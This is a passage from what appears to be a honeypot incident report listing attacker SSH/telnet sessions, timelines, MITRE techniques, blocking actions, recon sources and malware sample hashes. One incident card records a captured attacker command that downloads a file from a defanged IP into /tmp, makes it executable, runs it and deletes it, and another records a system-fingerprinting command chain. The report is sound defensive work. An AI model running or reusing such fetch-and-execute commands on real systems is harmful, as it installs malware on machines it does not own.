| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:20:08` | `cowrie.session.connect` |
| `2026-08-23 14:20:08` | `cowrie.client.version` |
| `2026-08-23 14:20:08` | `cowrie.client.kex` |
| `2026-08-23 14:20:10` | `cowrie.login.success` |
| `2026-08-23 14:20:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `126.13.48[.]207` to AbuseIPDB if not already reported
- [ ] Block `126.13.48[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-323b6b4423fa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 14:20 |
| **Last Seen** | 2026-08-23 14:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:20:15` | `cowrie.session.connect` |
| `2026-08-23 14:20:15` | `cowrie.client.version` |
| `2026-08-23 14:20:15` | `cowrie.client.kex` |
| `2026-08-23 14:20:17` | `cowrie.login.success` |
| `2026-08-23 14:20:18` | `cowrie.session.params` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.success` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:18` | `cowrie.command.input` |
| `2026-08-23 14:20:19` | `cowrie.log.closed` |
| `2026-08-23 14:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a0fe6849ce

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:24 |
| **Last Seen** | 2026-08-23 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:24:20` | `cowrie.session.connect` |
| `2026-08-23 14:24:20` | `cowrie.client.version` |
| `2026-08-23 14:24:21` | `cowrie.client.kex` |
| `2026-08-23 14:24:21` | `cowrie.login.success` |
| `2026-08-23 14:24:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:24:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:24:22` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93fce0a92d70

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:24 |
| **Last Seen** | 2026-08-23 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:24:24` | `cowrie.session.connect` |
| `2026-08-23 14:24:24` | `cowrie.client.version` |
| `2026-08-23 14:24:24` | `cowrie.client.kex` |
| `2026-08-23 14:24:25` | `cowrie.login.success` |
| `2026-08-23 14:24:25` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:24:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:24:25` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405075f7a594

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-23 14:25 |
| **Last Seen** | 2026-08-23 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:25:15` | `cowrie.session.connect` |
| `2026-08-23 14:25:15` | `cowrie.telnet.option` |
| `2026-08-23 14:25:15` | `cowrie.login.success` |
| `2026-08-23 14:25:16` | `cowrie.session.params` |
| `2026-08-23 14:25:16` | `cowrie.telnet.option` |
| `2026-08-23 14:25:16` | `cowrie.telnet.option` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.failed` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.success` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.failed` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.success` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.failed` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.success` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.command.failed` |
| `2026-08-23 14:25:16` | `cowrie.command.input` |
| `2026-08-23 14:25:16` | `cowrie.log.closed` |
| `2026-08-23 14:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3309189708e9

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-23 14:25 |
| **Last Seen** | 2026-08-23 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:25:15` | `cowrie.session.connect` |
| `2026-08-23 14:25:15` | `cowrie.client.version` |
| `2026-08-23 14:25:16` | `cowrie.client.kex` |
| `2026-08-23 14:25:16` | `cowrie.login.success` |
| `2026-08-23 14:25:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:25:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:25:16` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647572717330

| Field | Detail |
|---|---|
| **Source IP** | `93.118.139[.]170` |
| **First Seen** | 2026-08-23 14:27 |
| **Last Seen** | 2026-08-23 14:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:27:33` | `cowrie.session.connect` |
| `2026-08-23 14:27:37` | `cowrie.client.version` |
| `2026-08-23 14:27:37` | `cowrie.client.kex` |
| `2026-08-23 14:27:44` | `cowrie.login.success` |
| `2026-08-23 14:27:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.118.139[.]170` to AbuseIPDB if not already reported
- [ ] Block `93.118.139[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4037bfa762

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-08-23 14:27 |
| **Last Seen** | 2026-08-23 14:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:27:50` | `cowrie.session.connect` |
| `2026-08-23 14:27:51` | `cowrie.client.version` |
| `2026-08-23 14:27:51` | `cowrie.client.kex` |
| `2026-08-23 14:27:54` | `cowrie.login.success` |
| `2026-08-23 14:27:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d65337b4f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:34 |
| **Last Seen** | 2026-08-23 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:34:02` | `cowrie.session.connect` |
| `2026-08-23 14:34:02` | `cowrie.client.version` |
| `2026-08-23 14:34:02` | `cowrie.client.kex` |
| `2026-08-23 14:34:03` | `cowrie.login.success` |
| `2026-08-23 14:34:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:34:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:34:04` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5066596bc729

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:34 |
| **Last Seen** | 2026-08-23 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:34:05` | `cowrie.session.connect` |
| `2026-08-23 14:34:05` | `cowrie.client.version` |
| `2026-08-23 14:34:06` | `cowrie.client.kex` |
| `2026-08-23 14:34:07` | `cowrie.login.success` |
| `2026-08-23 14:34:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:34:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:34:07` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65df8d551d80

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-23 14:43 |
| **Last Seen** | 2026-08-23 14:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:43:01` | `cowrie.session.connect` |
| `2026-08-23 14:43:02` | `cowrie.client.version` |
| `2026-08-23 14:43:02` | `cowrie.client.kex` |
| `2026-08-23 14:43:03` | `cowrie.login.success` |
| `2026-08-23 14:43:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39f100ee994

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:43 |
| **Last Seen** | 2026-08-23 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:43:34` | `cowrie.session.connect` |
| `2026-08-23 14:43:34` | `cowrie.client.version` |
| `2026-08-23 14:43:34` | `cowrie.client.kex` |
| `2026-08-23 14:43:35` | `cowrie.login.success` |
| `2026-08-23 14:43:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:43:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:43:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a44430179f5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:43 |
| **Last Seen** | 2026-08-23 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:43:38` | `cowrie.session.connect` |
| `2026-08-23 14:43:38` | `cowrie.client.version` |
| `2026-08-23 14:43:38` | `cowrie.client.kex` |
| `2026-08-23 14:43:39` | `cowrie.login.success` |
| `2026-08-23 14:43:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:43:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:43:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a2cc18f37b

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-23 14:52 |
| **Last Seen** | 2026-08-23 14:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:52:27` | `cowrie.session.connect` |
| `2026-08-23 14:52:28` | `cowrie.client.version` |
| `2026-08-23 14:52:28` | `cowrie.client.kex` |
| `2026-08-23 14:52:29` | `cowrie.login.success` |
| `2026-08-23 14:52:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde8b94a9979

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:53 |
| **Last Seen** | 2026-08-23 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:53:01` | `cowrie.session.connect` |
| `2026-08-23 14:53:01` | `cowrie.client.version` |
| `2026-08-23 14:53:01` | `cowrie.client.kex` |
| `2026-08-23 14:53:02` | `cowrie.login.success` |
| `2026-08-23 14:53:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:53:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:53:03` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c5a8686655

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 14:53 |
| **Last Seen** | 2026-08-23 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:53:05` | `cowrie.session.connect` |
| `2026-08-23 14:53:05` | `cowrie.client.version` |
| `2026-08-23 14:53:05` | `cowrie.client.kex` |
| `2026-08-23 14:53:06` | `cowrie.login.success` |
| `2026-08-23 14:53:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:53:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 14:53:06` | `cowrie.direct-tcpip.data` |
| `2026-08-23 14:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.128[.]149` | **7** | 2026-08-23 12:55 | 2026-08-23 14:41 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-23 12:57 | 2026-08-23 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | **3** | 2026-08-23 14:36 | 2026-08-23 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-08-23 14:49 | 2026-08-23 14:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]109` | **3** | 2026-08-23 14:49 | 2026-08-23 14:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]87` | **3** | 2026-08-23 14:50 | 2026-08-23 14:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | **2** | 2026-08-23 13:37 | 2026-08-23 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.68.79[.]255` | 1 | 2026-08-23 13:59 | 2026-08-23 13:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.171.208[.]25` | 1 | 2026-08-23 13:42 | 2026-08-23 13:42 | 5s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]194` | 1 | 2026-08-23 13:00 | 2026-08-23 13:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]155` | 1 | 2026-08-23 13:26 | 2026-08-23 13:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `31.148.20[.]129` | 1 | 2026-08-23 12:55 | 2026-08-23 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-08-23 14:35 | 2026-08-23 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]247` | 1 | 2026-08-23 14:52 | 2026-08-23 14:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.91[.]172` | 1 | 2026-08-23 14:25 | 2026-08-23 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.20.134[.]97` | 1 | 2026-08-23 13:26 | 2026-08-23 13:27 | 62s | 0 | `T1592` | 🟢 LOW |
| `65.20.158[.]10` | 1 | 2026-08-23 14:28 | 2026-08-23 14:29 | 54s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-23 13:37 | 2026-08-23 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-23 13:15 | 2026-08-23 13:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-08-23 14:10 | 2026-08-23 14:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.210.47[.]194` | 1 | 2026-08-23 13:55 | 2026-08-23 13:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]14` | 1 | 2026-08-23 14:16 | 2026-08-23 14:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]21` | 1 | 2026-08-23 14:31 | 2026-08-23 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-23 14:43 | 2026-08-23 14:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-23 14:00 | 2026-08-23 14:01 | 50s | 0 | `T1592` | 🟢 LOW |
| `93.170.161[.]100` | 1 | 2026-08-23 14:43 | 2026-08-23 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.228.243[.]187` | 1 | 2026-08-23 14:35 | 2026-08-23 14:36 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
